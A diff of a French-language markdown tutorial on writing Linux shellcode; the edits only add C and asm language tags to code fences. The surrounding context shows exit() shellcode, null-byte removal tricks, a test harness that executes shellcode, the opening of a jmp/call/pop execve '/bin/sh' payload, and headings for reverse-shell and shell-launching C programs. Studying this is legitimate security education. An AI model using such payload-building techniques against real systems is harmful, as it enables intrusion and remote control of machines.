@@ -14,7 +14,7 @@ https://blog.securitybreak.io/reverse-engineering-tips-debugging-shellcode-e8212
 - Le mieux c'est de directement faire le shellcode en asm pour ne pas avoir à analyser le code asm provenant du code en C.
 
 **Exemple de programme en C à transformer en shellcode**
-```
+```C
 /*Écrire dans un fichier*/
 #include <stdio.h>
 int main() {
@@ -33,7 +33,7 @@ int main() {
 
 
 
-```
+```C
 /*Lancement d'un shell*/
 #include <stdio.h>
 #include <stdlib.h>
@@ -46,7 +46,7 @@ int main(){
 
 
 
-```
+```C
 /*Reverse shell sur linux target*/
 #include <stdio.h>
 #include <unistd.h>
@@ -105,7 +105,7 @@ int main(int argc, char *argv[])
 	- 3)
 		- `objdump -d exit_shellcode`
 		- il va afficher un truc du genre 
-```
+```asm
 exit_shellcode:     file format elf64-x86-64
 
 
@@ -134,7 +134,7 @@ Disassembly of section .text:
 ###### 6. Test du bon fonctionnement
 
 - Tu peux créer un petit programme qui exécute le shellcode. Par exemple :
-```
+```C
 #include <stdio.h>
 #include <string.h>
 char shellcode[] = "SHELLCODE";
@@ -161,7 +161,7 @@ int main() {
 ###### - Utilisation de l'opcode xor
 
 - Pour l'exemple, je vais reprendre le shellcode exit() dans lequel on peut voir des octets nuls.
-```
+```asm
   401000:       bb 00 00 00 00          mov    $0x0,%ebx
   401005:       b8 e7 00 00 00          mov    $0xe7,%eax
   40100a:         0f 05                              syscall
@@ -172,7 +172,7 @@ int main() {
 ###### - Fragmentation des registres
 
 - Pour l'exemple, je vais reprendre le shellcode exit() dans lequel on peut voir des octets nuls.
-```
+```asm
   401000:       bb 00 00 00 00          mov    $0x0,%ebx
   401005:       b8 e7 00 00 00          mov    $0xe7,%eax
   40100a:         0f 05                              syscall
@@ -187,7 +187,7 @@ int main() {
 ###### - Utilisation de push et pop
 
 - Pour l'exemple on va utiliser :
-```
+```asm
 xor    %edi,%edi            >       31 ff         
 mov    $0x3c,%eax      >       b8 3c 00 00 00          
 syscall                                >       0f 05
@@ -195,7 +195,7 @@ syscall                                >       0f 05
 - Là c'est une plus grande valeurs mais on pourrait quand même utiliser la fragmentation. 
 - Cependant, on peut aussi utiliser les fonctions push qui ajoute un élément tout en haut de la pile, et pop qui retire l'élément tout en haut de la pile pour le mettre dans l'opérand. On le fait donc en 2 étapes mais ça marche aussi.
 - Ça nous donnera 
-```
+```asm
 push $0x3c
 pop %eax
 ```
@@ -208,7 +208,7 @@ https://null-byte.wonderhowto.com/how-to/writing-64-bit-shellcode-part-2-removin
 - Sauf que le dernier octet c'est 00 donc on va devoir le changer en un octet non nul (n'importe lequel).
 - `movq $0x1168732f6e69622f, %rbx` 
 - Ensuite, on va décaler l'hexa de 0x08 vers la gauche (1 bit en hexa vaut 4 bit en bin) puis refaire un décalage vers la droite pour ajouter les nuls bytes. Ça va donc ressembler à 
-```
+```asm
 movq $0x1168732f6e69622f, %rbx
 shl $0x08, %rbx
 shr $0x08, %rbx
@@ -227,7 +227,7 @@ int main(){
 }
 ```
 - Si on disas exit :
-```
+```asm
    0x00000000004102e0 <+0>:     mov    $0xffffffffffffffc0,%rsi
    0x00000000004102e7 <+7>:     mov    $0xe7,%edx
    0x00000000004102ec <+12>:    jmp    0x4102f1 <_exit+17>
@@ -245,7 +245,7 @@ int main(){
 	- On voit qu'on effectue un syscall avec le registre %eax qui contient 0xe7 (231 en décimal).
 	- Bon enfin bref on s'en tape nous on veut créer un shellcode. Pour ça, il faut bien choisir les éléments dont on a vraiment besoin pour gagner de la place dans le shellcode. 
 	- Ce qu'il nous faut c'est l'instruction qui place 0 dans %ebx pour indiquer qu'on a pas d'autre arguments à passer, l'instruction qui place 231 dans %eax pour indiquer le numéro de syscall et enfin l'instruction syscall en elle-même. On va donc le mettre sous la forme :
-```
+```asm
 Section .text
 
 	global _start
@@ -266,7 +266,7 @@ _start:
 	- 3)
 		- `objdump -d exit_shellcode`
 		- il va afficher un truc du genre 
-```
+```asm
 exit_shellcode:     file format elf64-x86-64
 
 
@@ -289,7 +289,7 @@ Disassembly of section .text:
 
 - 
 	- Si tu le mets dans un programme pour tester et qu'ensuite t'utilise Strace pour voir les appels systèmes et les signaux, tu verras à la fin la fonction exit(0).
-```
+```C
 char shellcode[] = "\xbb\x00\x00\x00\x00"
                  "\xb8\x01\x00\x00\x00"
                  "\xcd\x80";
@@ -344,7 +344,7 @@ exit_group(0)                           = ?
 ###### Utilisation de execve() 
 
 - **Shellcode en C**
-```
+```C
 #include <stdio.h>
 int main(){
 	char *happy[2];
@@ -363,7 +363,7 @@ int main(){
 	- On va utiliser des adresses relatives à la base de la pile. En fait, on va créer nous même une pile. L'adresse de retour (adresse juste après l'instruction call) sera directement envoyée sur la pile. On va alors mettre une "instruction" qui définit une string qu'on va modifier après. Ensuite, on va pop le dernier élément de la stack (l'adresse de retour) vers le registre ESI. Ce registre va alors contenir une adresse d'INSTRUCTION mais qui contient notre string qu'on va modifier. On pourra se servir de ce registre pour référencer n'importe quel endroit de la pile. (la classe à Dallas)
 	- Pour faire cette pile, on peut utiliser un jmp qui renvoie vers une étiquette qui, elle, utilise un call (vers l'étiquette de notre shellcode) avec un Defined Byte qui définit la string '/bin/sh' qui sera donc sur l'adresse de retour. Donc la première instruction du shellcode devra être un `pop esi` pour dégager /bin/sh de la pile et foutre son adresse dans ESI.
 
-```
+```asm
 jmp short                   GotoCall
 
 shellcode:
